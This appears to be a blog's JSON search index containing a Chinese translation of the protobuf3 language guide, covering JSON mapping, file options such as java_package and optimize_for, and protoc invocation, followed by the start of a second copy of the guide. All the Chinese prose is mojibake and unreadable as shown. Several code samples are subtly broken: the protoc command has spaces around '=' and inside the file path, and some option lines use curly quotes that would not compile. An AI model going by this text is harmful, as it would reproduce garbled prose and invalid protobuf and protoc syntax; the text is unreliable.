JSONå€¼å°†æ˜¯ä½¿ç”¨å¸¦å¡«å……çš„æ ‡å‡†base64ç¼–ç ç¼–ç ä¸ºå­—ç¬¦ä¸²çš„æ•°æ®ã€‚æ¥å—å¸¦æœ‰/ä¸å¸¦å¡«å……çš„æ ‡å‡†æˆ–URLå®‰å…¨base64ç¼–ç ã€‚ |\n| int32ï¼Œfixed32ï¼Œuint32 | string        | `1, -10, 0`                              | JSONå€¼å°†æ˜¯åè¿›åˆ¶æ•°ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚                       |\n| int64ï¼Œfixed64ï¼Œuint64 | string        | `\"1\", \"-10\"`                             | JSONå€¼å°†æ˜¯åè¿›åˆ¶å­—ç¬¦ä¸²ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚                   |\n| float,double           | number        | `1.1, -10.0, 0, \"NaN\",\"Infinity\"`        | JSONå€¼å°†æ˜¯ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²å€¼â€œNaNâ€ï¼Œâ€œInfinityâ€å’Œâ€œ-Infinityâ€ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚æŒ‡æ•°è¡¨ç¤ºæ³•ä¹Ÿè¢«æ¥å—ã€‚ |\n| any                    | object        | `{\"@type\": \"url\", \"f\": v, â€¦ }`           | å¦‚æœAnyåŒ…å«å…·æœ‰ç‰¹æ®ŠJSONæ˜ å°„çš„å€¼ï¼Œåˆ™å°†æŒ‰å¦‚ä¸‹æ–¹å¼è¿›è¡Œè½¬æ¢ï¼šã€‚å¦åˆ™ï¼Œè¯¥å€¼å°†è½¬æ¢ä¸ºJSONå¯¹è±¡ï¼Œå¹¶å°†æ’å…¥è¯¥å­—æ®µä»¥æŒ‡ç¤ºå®é™…çš„æ•°æ®ç±»å‹ã€‚`{\"@type\": xxx, \"value\": yyy}``\"@type\"` |\n| Timestamp              | string        | `\"1972-01-01T10:00:20.021Z\"`             | ä½¿ç”¨RFC 3339ï¼Œå…¶ä¸­ç”Ÿæˆçš„è¾“å‡ºå°†å§‹ç»ˆè¢«Zæ ‡å‡†åŒ–å¹¶ä½¿ç”¨0,3,6æˆ–9ä¸ªå°æ•°ä½ã€‚ä¹Ÿæ¥å—â€œZâ€ä»¥å¤–çš„åç§»ã€‚ |\n| Duration               | string        | `\"1.000340012s\", \"1s\"`                   | ç”Ÿæˆçš„è¾“å‡ºå§‹ç»ˆåŒ…å«0,3,6æˆ–9ä¸ªå°æ•°ä½ï¼Œå…·ä½“å–å†³äºæ‰€éœ€çš„ç²¾åº¦ï¼Œåè·Ÿåç¼€â€œsâ€ã€‚æ¥å—çš„æ˜¯ä»»ä½•å°æ•°ä½ï¼ˆä¹Ÿæ²¡æœ‰ï¼‰ï¼Œåªè¦å®ƒä»¬ç¬¦åˆçº³ç§’ç²¾åº¦å¹¶ä¸”åç¼€â€œsâ€æ˜¯å¿…éœ€çš„ã€‚ |\n| Struct                 | `object`      | `{ â€¦ }`                                  | ä»»ä½•JSONå¯¹è±¡ã€‚è§ã€‚`struct.proto`                             |\n| Wrapper types          | various types | `2, \"2\", \"foo\", true,\"true\", null, 0, â€¦` | åŒ…è£…å™¨åœ¨JSONä¸­ä½¿ç”¨ä¸åŒ…è£…åŸºå…ƒç±»å‹ç›¸åŒçš„è¡¨ç¤ºå½¢å¼ï¼Œé™¤äº†`null`åœ¨æ•°æ®è½¬æ¢å’Œä¼ è¾“æœŸé—´å…è®¸å’Œä¿ç•™çš„è¡¨ç¤ºå½¢å¼ã€‚ |\n| FieldMask              | string        | `\"f.fooBar,h\"`                           | è§ã€‚`field_mask.proto`                                       |\n| ListValue              | array         | `[foo, bar, â€¦]`                          |                                                              |\n| Value                  | value         |                                          | ä»»ä½•JSONå€¼                                                   |\n| NullValue              | null          |                                          | JSON null                                                    |\n\n##### 13.1 JSONé€‰é¡¹\n\nproto3  JSONå®ç°å¯ä»¥æä¾›ä»¥ä¸‹é€‰é¡¹ï¼š\n\n- **ä½¿ç”¨é»˜è®¤å€¼å‘å‡ºå­—æ®µ**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œproto3 JSONè¾“å‡ºä¸­çœç•¥äº†**å…·æœ‰é»˜è®¤å€¼çš„**å­—æ®µã€‚å®ç°å¯ä»¥æä¾›è¦†ç›–æ­¤è¡Œä¸ºçš„é€‰é¡¹ï¼Œå¹¶ä½¿ç”¨å…¶é»˜è®¤å€¼è¾“å‡ºå­—æ®µã€‚\n- **å¿½ç•¥æœªçŸ¥å­—æ®µ**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒProto3 JSONè§£æå™¨åº”æ‹’ç»æœªçŸ¥å­—æ®µï¼Œä½†å¯ä»¥æä¾›å¿½ç•¥è§£æä¸­æœªçŸ¥å­—æ®µçš„é€‰é¡¹ã€‚\n- **ä½¿ç”¨protoå­—æ®µåç§°è€Œä¸æ˜¯å°å†™é©¼å³°åç§°**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œproto3 JSONæ‰“å°æœºåº”å°†å­—æ®µåç§°è½¬æ¢ä¸ºå°å†™é©¼å³°å¹¶å°†å…¶ç”¨ä½œJSONåç§°ã€‚å®ç°å¯ä»¥æä¾›ä½¿ç”¨protoå­—æ®µåç§°ä½œä¸ºJSONåç§°çš„é€‰é¡¹ã€‚Proto3 JSONè§£æå™¨éœ€è¦æ¥å—è½¬æ¢åçš„å°å†™é©¼å³°åç§°å’Œprotoå­—æ®µåç§°ã€‚\n- **å°†æšä¸¾å€¼å‘é€ä¸ºæ•´æ•°è€Œä¸æ˜¯å­—ç¬¦ä¸²**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨JSONè¾“å‡ºä¸­ä½¿ç”¨æšä¸¾å€¼çš„åç§°ã€‚å¯ä»¥æä¾›é€‰é¡¹ä»¥ä½¿ç”¨æšä¸¾å€¼çš„æ•°å€¼ã€‚\n\n### 14. é€‰é¡¹\n\n`.proto`æ–‡ä»¶ä¸­çš„å„ä¸ªå£°æ˜å¯ä»¥ä½¿ç”¨è®¸å¤š*é€‰é¡¹*è¿›è¡Œæ³¨é‡Šã€‚é€‰é¡¹ä¸ä¼šæ›´æ”¹å£°æ˜çš„æ•´ä½“å«ä¹‰ï¼Œä½†å¯èƒ½ä¼šå½±å“åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­å¤„ç†å®ƒçš„æ–¹å¼ã€‚å¯ç”¨é€‰é¡¹çš„å®Œæ•´åˆ—è¡¨åœ¨ä¸­å®šä¹‰`google/protobuf/descriptor.proto`ã€‚\n\nä¸€äº›é€‰é¡¹æ˜¯æ–‡ä»¶çº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥åœ¨é¡¶çº§èŒƒå›´å†…ç¼–å†™ï¼Œè€Œä¸æ˜¯åœ¨ä»»ä½•æ¶ˆæ¯ï¼Œæšä¸¾æˆ–æœåŠ¡å®šä¹‰ä¸­ã€‚ä¸€äº›é€‰é¡¹æ˜¯æ¶ˆæ¯çº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥å†™åœ¨æ¶ˆæ¯å®šä¹‰ä¸­ã€‚ä¸€äº›é€‰é¡¹æ˜¯å­—æ®µçº§é€‰é¡¹ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åº”è¯¥å†™åœ¨å­—æ®µå®šä¹‰ä¸­ã€‚é€‰é¡¹ä¹Ÿå¯ä»¥å†™åœ¨æšä¸¾ç±»å‹ï¼Œæšä¸¾å€¼ï¼ŒæœåŠ¡ç±»å‹å’ŒæœåŠ¡æ–¹æ³•ä¸Š; ä½†æ˜¯ï¼Œç›®å‰æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„é€‰æ‹©ã€‚\n\nä»¥ä¸‹æ˜¯ä¸€äº›æœ€å¸¸ç”¨çš„é€‰é¡¹ï¼š\n\n- `java_package`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šç”¨äºç”Ÿæˆçš„Javaç±»çš„åŒ…ã€‚å¦‚æœ`.proto`æ–‡ä»¶ä¸­æ²¡æœ‰ç»™å‡ºæ˜¾å¼é€‰é¡¹`java_package`ï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨protoåŒ…ï¼ˆä½¿ç”¨æ–‡ä»¶ä¸­çš„â€œpackageâ€å…³é”®å­—æŒ‡å®š  .proto  ï¼‰ã€‚ä½†æ˜¯ï¼ŒprotoåŒ…é€šå¸¸ä¸èƒ½ç”Ÿæˆå¥½çš„JavaåŒ…ï¼Œå› ä¸ºprotoåŒ…ä¸ä¼šä»¥åå‘åŸŸåå¼€å¤´ã€‚å¦‚æœä¸ç”ŸæˆJavaä»£ç ï¼Œåˆ™æ­¤é€‰é¡¹æ— æ•ˆã€‚\n\n  ```protobuf\n  option java_package =â€œcom.example.fooâ€;\n  ```\n  \n- `java_multiple_files` ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šå¯¼è‡´åœ¨åŒ…çº§åˆ«å®šä¹‰é¡¶çº§æ¶ˆæ¯ï¼Œæšä¸¾å’ŒæœåŠ¡ï¼Œè€Œä¸æ˜¯åœ¨.protoæ–‡ä»¶ä¹‹åå‘½åçš„å¤–éƒ¨ç±»ä¸­ã€‚\n\n```protobuf\noption java_multiple_files = true;\n```\n\n- `java_outer_classname`ï¼ˆfile optionï¼‰ï¼šè¦ç”Ÿæˆçš„æœ€å¤–å±‚Javaç±»ï¼ˆä»¥åŠæ–‡ä»¶åï¼‰çš„ç±»åã€‚å¦‚æœ  `.proto`æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š `java_outer_classname`ï¼Œåˆ™é€šè¿‡å°†`.proto`æ–‡ä»¶åè½¬æ¢ä¸ºé©¼å³°æ ¼å¼ï¼ˆå› æ­¤ `foo_bar.proto` æˆä¸º`FooBar.java`ï¼‰æ¥æ„é€ ç±»åã€‚å¦‚æœä¸ç”ŸæˆJavaä»£ç ï¼Œåˆ™æ­¤é€‰é¡¹æ— æ•ˆã€‚\n\n```protobuf\n  option java_outer_classname =â€œPonycopterâ€;\n\n```\n\n- `optimize_for`\n\n  ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šå¯ä»¥è®¾ç½®ä¸º`SPEED`ï¼Œ`CODE_SIZE`æˆ–`LITE_RUNTIME`ã€‚è¿™ä¼šä»¥ä¸‹åˆ—æ–¹å¼å½±å“C ++å’ŒJavaä»£ç ç”Ÿæˆå™¨ï¼ˆå¯èƒ½è¿˜æœ‰ç¬¬ä¸‰æ–¹ç”Ÿæˆå™¨ï¼‰ï¼š\n\n  - `SPEED`ï¼ˆé»˜è®¤å€¼ï¼‰ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆç”¨äºå¯¹æ¶ˆæ¯ç±»å‹è¿›è¡Œåºåˆ—åŒ–ï¼Œè§£æå’Œæ‰§è¡Œå…¶ä»–å¸¸è§æ“ä½œçš„ä»£ç ã€‚æ­¤ä»£ç ç»è¿‡é«˜åº¦ä¼˜åŒ–ã€‚\n  - `CODE_SIZE`ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆæœ€å°‘çš„ç±»ï¼Œå¹¶ä¾èµ–äºåŸºäºåå°„çš„å…±äº«ä»£ç æ¥å®ç°åºåˆ—åŒ–ï¼Œè§£æå’Œå„ç§å…¶ä»–æ“ä½œã€‚å› æ­¤ç”Ÿæˆçš„ä»£ç æ¯”ä½¿ç”¨`SPEED`å°å¾—å¤šï¼Œä½†æ“ä½œä¼šæ›´æ…¢ã€‚ç±»ä»å°†å®ç°ä¸`SPEED`æ¨¡å¼å®Œå…¨ç›¸åŒçš„å…¬å…±API ã€‚æ­¤æ¨¡å¼åœ¨åŒ…å«éå¸¸å¤§æ•°é‡çš„`.proto`æ–‡ä»¶çš„åº”ç”¨ç¨‹åºä¸­æœ€æœ‰ç”¨ï¼Œå¹¶ä¸”ä¸éœ€è¦æ‰€æœ‰æ–‡ä»¶éƒ½éå¸¸å¿«é€Ÿã€‚\n  - `LITE_RUNTIME`ï¼šprotobuf ç¼–è¯‘å™¨å°†ç”Ÿæˆä»…ä¾èµ–äºâ€œliteâ€è¿è¡Œæ—¶åº“ï¼ˆ`libprotobuf-lite`è€Œä¸æ˜¯`libprotobuf`ï¼‰çš„ç±»ã€‚ç²¾ç®€ç‰ˆè¿è¡Œæ—¶æ¯”æ•´ä¸ªåº“å°å¾—å¤šï¼ˆå¤§çº¦å°ä¸€ä¸ªæ•°é‡çº§ï¼‰ï¼Œä½†çœç•¥äº†æè¿°ç¬¦å’Œåå°„ç­‰ç‰¹å®šåŠŸèƒ½ã€‚è¿™å¯¹äºåœ¨ç§»åŠ¨ç”µè¯ç­‰å—é™å¹³å°ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºå°¤å…¶æœ‰ç”¨ã€‚ç¼–è¯‘å™¨ä»ç„¶ä¼šåƒåœ¨`SPEED`æ¨¡å¼ä¸­ä¸€æ ·ç”Ÿæˆæ‰€æœ‰æ–¹æ³•çš„å¿«é€Ÿå®ç°ã€‚ç”Ÿæˆçš„ç±»å°†ä»…å®ç°`MessageLite`æ¯ç§è¯­è¨€çš„æ¥å£ï¼Œè¯¥æ¥å£ä»…æä¾›å®Œæ•´`Message`æ¥å£çš„æ–¹æ³•çš„å­é›†ã€‚\n\n  ```protobuf\n  option optimize_for = CODE_SIZE;\n  ```\n  \n- `cc_enable_arenas`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šä¸ºC ++ç”Ÿæˆçš„ä»£ç å¯ç”¨[ç«æŠ€åœºåˆ†é…](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Farenas)ã€‚\n\n- `objc_class_prefix`ï¼ˆæ–‡ä»¶é€‰é¡¹ï¼‰ï¼šè®¾ç½®Objective-Cç±»å‰ç¼€ï¼Œè¯¥å‰ç¼€é¢„å…ˆæ·»åŠ åˆ°æ­¤.protoçš„æ‰€æœ‰Objective-Cç”Ÿæˆçš„ç±»å’Œæšä¸¾ä¸­ã€‚æ²¡æœ‰é»˜è®¤å€¼ã€‚æ‚¨åº”è¯¥ä½¿ç”¨[Appleå»ºè®®çš„](https://link.juejin.im?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fios%2Fdocumentation%2FCocoa%2FConceptual%2FProgrammingWithObjectiveC%2FConventions%2FConventions.html%23%2F%2Fapple_ref%2Fdoc%2Fuid%2FTP40011210-CH10-SW4) 3-5ä¸ªå¤§å†™å­—ç¬¦ä¹‹é—´çš„å‰ç¼€ã€‚è¯·æ³¨æ„ï¼ŒAppleä¿ç•™æ‰€æœ‰2ä¸ªå­—æ¯çš„å‰ç¼€ã€‚\n\n- `deprecated`ï¼ˆå­—æ®µé€‰é¡¹ï¼‰ï¼šå¦‚æœè®¾ç½®ä¸º`true`ï¼Œåˆ™è¡¨ç¤ºè¯¥å­—æ®µå·²å¼ƒç”¨ï¼Œæ–°ä»£ç ä¸åº”ä½¿ç”¨è¯¥å­—æ®µã€‚åœ¨å¤§å¤šæ•°è¯­è¨€ä¸­ï¼Œè¿™æ²¡æœ‰å®é™…æ•ˆæœã€‚åœ¨Javaä¸­ï¼Œè¿™æˆä¸ºä¸€ä¸ª`@Deprecated`æ³¨é‡Šã€‚å°†æ¥ï¼Œå…¶ä»–ç‰¹å®šäºè¯­è¨€çš„ä»£ç ç”Ÿæˆå™¨å¯èƒ½ä¼šåœ¨å­—æ®µçš„è®¿é—®å™¨ä¸Šç”Ÿæˆå¼ƒç”¨æ³¨é‡Šï¼Œè¿™å°†å¯¼è‡´åœ¨ç¼–è¯‘å°è¯•ä½¿ç”¨è¯¥å­—æ®µçš„ä»£ç æ—¶å‘å‡ºè­¦å‘Šã€‚å¦‚æœä»»ä½•äººéƒ½æ²¡æœ‰ä½¿ç”¨è¯¥å­—æ®µï¼Œå¹¶ä¸”æ‚¨å¸Œæœ›é˜»æ­¢æ–°ç”¨æˆ·ä½¿ç”¨è¯¥å­—æ®µï¼Œè¯·è€ƒè™‘ä½¿ç”¨ä¿ç•™è¯­å¥æ›¿æ¢å­—æ®µå£°æ˜ã€‚\n\n  ```protobuf\n  int32 old_field = 6 [deprecated = true];\n  ```\n\n##### 14.1 è‡ªå®šä¹‰é€‰é¡¹\n\nProtocol Buffersè¿˜å…è®¸æ‚¨å®šä¹‰å’Œä½¿ç”¨è‡ªå·±çš„é€‰é¡¹ã€‚è¿™æ˜¯å¤§å¤šæ•°äººä¸éœ€è¦çš„**é«˜çº§åŠŸèƒ½**ã€‚å¦‚æœæ‚¨ç¡®å®è®¤ä¸ºéœ€è¦åˆ›å»ºè‡ªå·±çš„é€‰é¡¹ï¼Œè¯·å‚é˜…[Proto2è¯­è¨€æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23customoptions)ä»¥è·å–è¯¦ç»†ä¿¡æ¯ã€‚è¯·æ³¨æ„ï¼Œåˆ›å»ºè‡ªå®šä¹‰é€‰é¡¹ä½¿ç”¨çš„[æ‰©å±•å](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23extensions)ä»…å…è®¸ç”¨äºproto3ä¸­çš„è‡ªå®šä¹‰é€‰é¡¹ã€‚\n\n### 15. ç”Ÿæˆæ‚¨çš„ç±»\n\næ ¹æ®å®é™…å·¥ä½œéœ€è¦ï¼Œç”Ÿæˆä»¥ä¸‹å¯¹åº”è¯­è¨€çš„è‡ªå®šä¹‰æ¶ˆæ¯ç±»å‹Javaï¼ŒPythonï¼ŒC ++ï¼ŒGo, Ruby, Objective-Cï¼Œæˆ–Cï¼ƒçš„`.proto`æ–‡ä»¶ï¼Œä½ éœ€è¦è¿è¡Œprotobuf ç¼–è¯‘å™¨`protoc`ä¸Š`.proto`ã€‚å¦‚æœå°šæœªå®‰è£…ç¼–è¯‘å™¨ï¼Œè¯·[ä¸‹è½½è¯¥è½¯ä»¶åŒ…](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fdownloads.html)å¹¶æŒ‰ç…§è‡ªè¿°æ–‡ä»¶ä¸­çš„è¯´æ˜è¿›è¡Œæ“ä½œã€‚å¯¹äºGoï¼Œæ‚¨è¿˜éœ€è¦ä¸ºç¼–è¯‘å™¨å®‰è£…ä¸€ä¸ªç‰¹æ®Šçš„ä»£ç ç”Ÿæˆå™¨æ’ä»¶ï¼šæ‚¨å¯ä»¥åœ¨GitHubä¸Šçš„[golang / protobuf](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fprotobuf%2F)å­˜å‚¨åº“ä¸­æ‰¾åˆ°è¿™ä¸ªå’Œå®‰è£…è¯´æ˜ã€‚\n\nProtobuf ç¼–è¯‘å™¨çš„è°ƒç”¨å¦‚ä¸‹ï¼š\n\n```protobuf\nprotoc --proto_path = IMPORT_PATH --cpp_out = DST_DIR --java_out = DST_DIR --python_out = DST_DIR --go_out = DST_DIR --ruby_out = DST_DIR --objc_out = DST_DIR --csharp_out = DST_DIR  path / to / file .proto\n```\n\n- `IMPORT_PATH`æŒ‡å®š`.proto`è§£æ`import`æŒ‡ä»¤æ—¶åœ¨å…¶ä¸­æŸ¥æ‰¾æ–‡ä»¶çš„ç›®å½•ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ä½¿ç”¨å½“å‰ç›®å½•ã€‚å¯ä»¥é€šè¿‡`--proto_path`å¤šæ¬¡ä¼ é€’é€‰é¡¹æ¥æŒ‡å®šå¤šä¸ªå¯¼å…¥ç›®å½•; ä»–ä»¬å°†æŒ‰é¡ºåºæœç´¢ã€‚ å¯ä»¥ç”¨ä½œç®€çŸ­çš„å½¢å¼ã€‚ `-I=*IMPORT_PATH*``--proto_path`\n\n- æ‚¨å¯ä»¥æä¾›ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡ºæŒ‡ä»¤ï¼š\n\n  - `--cpp_out`ç”ŸæˆC ++ä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[C ++ç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcpp-generated)ã€‚\n  - `--java_out`ç”ŸæˆJavaä»£ç `DST_DIR`ã€‚è¯·å‚é˜…[çš„Javaç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fjava-generated)æ›´å¤šã€‚\n  - `--python_out`ç”ŸæˆPythonä»£ç `DST_DIR`ã€‚çœ‹åˆ°[çš„Pythonç”Ÿæˆçš„ä»£ç çš„å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fpython-generated)æ›´å¤šã€‚\n  - `--go_out`ç”ŸæˆGoä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Goç”Ÿæˆä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fgo-generated)ã€‚\n  - `--ruby_out`ç”ŸæˆRubyä»£ç `DST_DIR`ã€‚Rubyç”Ÿæˆçš„ä»£ç å‚è€ƒå³å°†æ¨å‡ºï¼\n  - `--objc_out`ç”ŸæˆObjective-Cä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Objective-Cç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fobjective-c-generated)ã€‚\n  - `--csharp_out`ç”ŸæˆCï¼ƒä»£ç `DST_DIR`ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[Cï¼ƒç”Ÿæˆçš„ä»£ç å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcsharp-generated)ã€‚\n  - `--php_out`ç”ŸæˆPHPä»£ç `DST_DIR`ã€‚çœ‹åˆ°[PHPç”Ÿæˆçš„ä»£ç çš„å‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fphp-generated)æ›´å¤šã€‚\n\n  ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œå¦‚æœDST_DIRç»“æŸäº`.zip`æˆ–.`jar`ï¼Œç¼–è¯‘å™¨ä¼šå°†è¾“å‡ºå†™å…¥å…·æœ‰ç»™å®šåç§°çš„å•ä¸ªZIPæ ¼å¼å­˜æ¡£æ–‡ä»¶ã€‚`.jar`è¾“å‡ºè¿˜å°†æ ¹æ®Java JARè§„èŒƒçš„è¦æ±‚æä¾›æ¸…å•æ–‡ä»¶ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœè¾“å‡ºå­˜æ¡£å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–; ç¼–è¯‘å™¨ä¸å¤Ÿæ™ºèƒ½ï¼Œæ— æ³•å°†æ–‡ä»¶æ·»åŠ åˆ°ç°æœ‰å­˜æ¡£ä¸­ã€‚\n\n- æ‚¨å¿…é¡»æä¾›ä¸€ä¸ªæˆ–å¤šä¸ª`.proto`æ–‡ä»¶ä½œä¸ºè¾“å…¥ã€‚`.proto`å¯ä»¥ä¸€æ¬¡æŒ‡å®šå¤šä¸ªæ–‡ä»¶ã€‚è™½ç„¶æ–‡ä»¶æ˜¯ç›¸å¯¹äºå½“å‰ç›®å½•å‘½åçš„ï¼Œä½†æ¯ä¸ªæ–‡ä»¶å¿…é¡»ä½äºå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œ`IMPORT_PATH`ä»¥ä¾¿ç¼–è¯‘å™¨å¯ä»¥ç¡®å®šå…¶è§„èŒƒåç§°ã€‚\n\n\n\n### 16. å‚è€ƒèµ„æ–™\n\n+ https://juejin.im/post/5bb597c2e51d450e6e03e42d\n+ https://colobu.com/2017/03/16/Protobuf3-language-guide/","tags":["protobuf"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"protobuf3è¯­æ³•æŒ‡å—","url":"%2Fp%2F21122343.html","content":"\nProtocol Bufferæ˜¯Googleçš„è¯­è¨€ä¸­ç«‹çš„ï¼Œå¹³å°ä¸­ç«‹çš„ï¼Œå¯æ‰©å±•æœºåˆ¶çš„ï¼Œç”¨äºåºåˆ—åŒ–ç»“æ„åŒ–æ•°æ® - å¯¹æ¯”XMLï¼Œä½†æ›´å°ï¼Œæ›´å¿«ï¼Œæ›´ç®€å•ã€‚æ‚¨å¯ä»¥å®šä¹‰æ•°æ®çš„ç»“æ„åŒ–ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ç‰¹æ®Šç”Ÿæˆçš„æºä»£ç è½»æ¾åœ°åœ¨å„ç§æ•°æ®æµä¸­ä½¿ç”¨å„ç§è¯­è¨€ç¼–å†™å’Œè¯»å–ç»“æ„åŒ–æ•°æ®ã€‚\n\n<!-- more -->\n\n### 1. å®šä¹‰æ¶ˆæ¯ç±»å‹\n\nå…ˆæ¥çœ‹ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­ã€‚å‡è®¾ä½ æƒ³å®šä¹‰ä¸€ä¸ªâ€œæœç´¢è¯·æ±‚â€çš„æ¶ˆæ¯æ ¼å¼ï¼Œæ¯ä¸€ä¸ªè¯·æ±‚å«æœ‰ä¸€ä¸ªæŸ¥è¯¢å­—ç¬¦ä¸²ã€ä½ æ„Ÿå…´è¶£çš„æŸ¥è¯¢ç»“æœæ‰€åœ¨çš„é¡µæ•°ï¼Œä»¥åŠæ¯ä¸€é¡µå¤šå°‘æ¡æŸ¥è¯¢ç»“æœã€‚å¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„æ–¹å¼æ¥å®šä¹‰æ¶ˆæ¯ç±»å‹çš„.protoæ–‡ä»¶äº†ï¼š\n\n```protobuf\nsyntax = \"proto3\";\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n```\n\n- è¯¥æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šæ‚¨æ­£åœ¨ä½¿ç”¨`proto3`è¯­æ³•ï¼šå¦‚æœæ‚¨ä¸è¿™æ ·åšï¼Œprotobuf ç¼–è¯‘å™¨å°†å‡å®šæ‚¨æ­£åœ¨ä½¿ç”¨[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)ã€‚è¿™å¿…é¡»æ˜¯æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªéç©ºçš„éæ³¨é‡Šè¡Œã€‚\n- æ‰€è¿°`SearchRequest`æ¶ˆæ¯å®šä¹‰æŒ‡å®šäº†ä¸‰ä¸ªå­—æ®µï¼ˆåç§°/å€¼å¯¹ï¼‰ï¼Œä¸€ä¸ªç”¨äºè¦åœ¨æ­¤ç±»å‹çš„æ¶ˆæ¯ä¸­åŒ…å«çš„æ¯ä¸ªæ•°æ®ç‰‡æ®µã€‚æ¯ä¸ªå­—æ®µéƒ½æœ‰ä¸€ä¸ªåç§°å’Œç±»å‹ã€‚\n\n##### 1.1 æŒ‡å®šå­—æ®µç±»å‹\n\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰å­—æ®µéƒ½æ˜¯[æ ‡é‡ç±»å‹](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)ï¼šä¸¤ä¸ªæ•´æ•°ï¼ˆ`page_number`å’Œ`result_per_page`ï¼‰å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆ`query`ï¼‰ã€‚ä½†æ˜¯ï¼Œæ‚¨è¿˜å¯ä»¥ä¸ºå­—æ®µæŒ‡å®šåˆæˆç±»å‹ï¼ŒåŒ…æ‹¬[æšä¸¾](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)å’Œå…¶ä»–æ¶ˆæ¯ç±»å‹ã€‚\n\n\n\n##### 1.2 åˆ†é…æ ‡è¯†å·\n\næ­£å¦‚ä¸Šè¿°æ–‡ä»¶æ ¼å¼ï¼Œåœ¨æ¶ˆæ¯å®šä¹‰ä¸­ï¼Œæ¯ä¸ªå­—æ®µéƒ½æœ‰å”¯ä¸€çš„ä¸€ä¸ª**æ•°å­—æ ‡è¯†ç¬¦**ã€‚è¿™äº›æ ‡è¯†ç¬¦æ˜¯ç”¨æ¥åœ¨æ¶ˆæ¯çš„[äºŒè¿›åˆ¶æ 